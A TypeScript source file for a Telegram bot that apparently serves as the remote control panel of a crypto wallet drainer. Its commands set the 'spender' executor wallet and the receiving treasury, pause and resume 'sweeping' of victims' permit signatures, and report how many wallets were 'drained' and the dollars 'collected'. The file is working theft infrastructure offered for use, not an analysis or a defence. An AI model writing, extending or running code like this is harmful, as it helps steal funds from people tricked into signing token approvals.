import { config } from './config';
import { db, kv, activeSpender, activeRecipient } from './db';

const TG = 'https://api.telegram.org';

export function sendTelegram(text: string) {
  const chatId = config.telegramChatId || kv.get('telegram_chat');
  if (!config.telegramToken || !chatId) return;
  fetch(`${TG}/bot${config.telegramToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML', disable_web_page_preview: true }),
  }).catch(() => {});
}

function isAddress(v: string) {
  return /^0x[0-9a-fA-F]{40}$/.test(v);
}

// ── /pair brute-force lockout: 5 wrong codes per chat → 10 min cooldown ──
const pairAttempts = new Map<string, { n: number; since: number }>();

async function handleMessage(msg: any) {
  const chatId = String(msg?.chat?.id ?? '');
  const text = String(msg?.text ?? '').trim();
  if (!chatId || !text) return;

  const paired = config.telegramChatId || kv.get('telegram_chat');
  const [cmdRaw, ...args] = text.split(/\s+/);
  const cmd = cmdRaw.split('@')[0].toLowerCase();
  const arg = args[0]?.trim();

  // ── pairing: only via /pair <TELEGRAM_PAIR_CODE>. Never auto-pair —
  //    the first random DM must not become the owner. ──
  if (cmd === '/pair') {
    if (!config.pairCode) { reply(chatId, '⛔ Pairing disabled — set TELEGRAM_PAIR_CODE in .env first.'); return; }
    const lock = pairAttempts.get(chatId);
    if (lock && lock.n >= 5 && Date.now() - lock.since < 10 * 60 * 1000) {
      reply(chatId, '⛔ Too many wrong codes — try again in 10 minutes.');
      return;
    }
    if (arg !== config.pairCode) {
      const n = (lock?.n ?? 0) + 1;
      pairAttempts.set(chatId, { n, since: lock?.since ?? Date.now() });
      reply(chatId, '⛔ Wrong code.');
      return;
    }
    pairAttempts.delete(chatId);
    kv.set('telegram_chat', chatId);
    reply(chatId, `✅ Paired! Chat ID <code>${chatId}</code> saved.\n\nYou now control the backend from here.`);
    return;
  }

  if (!paired) { reply(chatId, '⛔ Not paired. Send /pair <code>.'); return; }
  if (paired !== chatId) { reply(chatId, '⛔ Not paired.'); return; }

  switch (cmd) {
    case '/start':
    case '/help':
      reply(chatId,
        '🤖 <b>Commands</b>\n' +
        '/status — full status\n' +
        '/stats — telemetry counts\n' +
        '/spender 0x… — set executor wallet (⚠️ old stored signatures bind to the OLD spender)\n' +
        '/wallet 0x… — set receive wallet\n' +
        '/gas 50 — max gas gwei\n' +
        '/pause / /resume — pause sweeping\n' +
        '/spent — executor totals');
      break;

    case '/status': {
      const one = (s: string) => (db.prepare('SELECT COUNT(*) c FROM signatures WHERE status = ?').get(s) as any).c;
      reply(chatId,
        '📊 <b>Status</b>\n' +
        `👑 Spender: <code>${activeSpender() || 'NOT SET'}</code>\n` +
        `🏦 Receiver: <code>${activeRecipient() || 'NOT SET'}</code>\n` +
        `⛽ Max gas: ${kv.get('max_gas') ?? config.maxGasGwei} gwei\n` +
        `⛓ Chains: ${Object.keys(config.chains).join(', ') || 'none'}\n` +
        `📥 Pending: ${one('pending')} | 🔓 Permitted: ${one('permitted')} | ✅ Executed: ${one('executed')} | ❌ Failed: ${one('failed')}\n` +
        `${kv.get('paused') === '1' ? '⏸ PAUSED' : '▶️ Running'}`);
      break;
    }

    case '/spender':
      if (!isAddress(arg ?? '')) { reply(chatId, '❌ Usage: /spender 0xYourExecutorWallet'); break; }
      kv.set('active_spender', arg);
      reply(chatId, `👑 Spender set to <code>${arg}</code>\n⚠️ Signatures stored BEFORE this change bind to the old spender — sweep them with the old key first.`);
      sendTelegram(`🔄 <b>Spender rotated</b> → <code>${arg}</code>`);
      break;

    case '/wallet':
      if (!isAddress(arg ?? '')) { reply(chatId, '❌ Usage: /wallet 0xYourTreasury'); break; }
      kv.set('recipient', arg);
      reply(chatId, `🏦 Receive wallet set to <code>${arg}</code>`);
      break;

    case '/gas': {
      const v = Number(arg);
      if (!v || v <= 0) { reply(chatId, '❌ Usage: /gas 50'); break; }
      kv.set('max_gas', String(v));
      reply(chatId, `⛽ Max gas set to ${v} gwei — applies on the next sweep`);
      break;
    }

    case '/pause':
      kv.set('paused', '1');
      reply(chatId, '⏸ Sweeping paused');
      break;

    case '/resume':
      kv.set('paused', '0');
      reply(chatId, '▶️ Sweeping resumed');
      break;

    case '/stats': {
      const rows = db.prepare(
        "SELECT step, COUNT(*) c FROM telemetry GROUP BY step ORDER BY c DESC LIMIT 12"
      ).all() as any[];
      reply(chatId, '📈 <b>Telemetry</b>\n' + rows.map((r) => `${r.step}: ${r.c}`).join('\n'));
      break;
    }

    case '/spent': {
      // was listed in /help but never implemented — here it is
      const row = db.prepare(
        "SELECT COUNT(*) c, COALESCE(SUM(batch_value_usd), 0) usd FROM signatures WHERE status = 'executed'"
      ).get() as any;
      reply(chatId,
        '💰 <b>Totals</b>\n' +
        `✅ ${row.c} wallet(s) drained\n` +
        `💵 ~$${Number(row.usd ?? 0).toFixed(2)} collected (est. from claim-time quotes)`);
      break;
    }

    default:
      if (cmd.startsWith('/')) reply(chatId, '❓ Unknown command. /help');
      break; // plain text from a paired chat is ignored
  }
}

function reply(chatId: string, text: string) {
  fetch(`${TG}/bot${config.telegramToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML', disable_web_page_preview: true }),
  }).catch(() => {});
}

export function startTelegramBot() {
  if (!config.telegramToken) return;
  poll();
}

async function poll() {
  let offset = 0;
  for (;;) {
    try {
      const res = await fetch(`${TG}/bot${config.telegramToken}/getUpdates?timeout=25&offset=${offset + 1}`);
      const data = await res.json();
      for (const upd of data.result ?? []) {
        offset = Math.max(offset, upd.update_id);
        handleMessage(upd.message).catch(() => {});
      }
    } catch {
      await new Promise((r) => setTimeout(r, 3000));
    }
  }
}
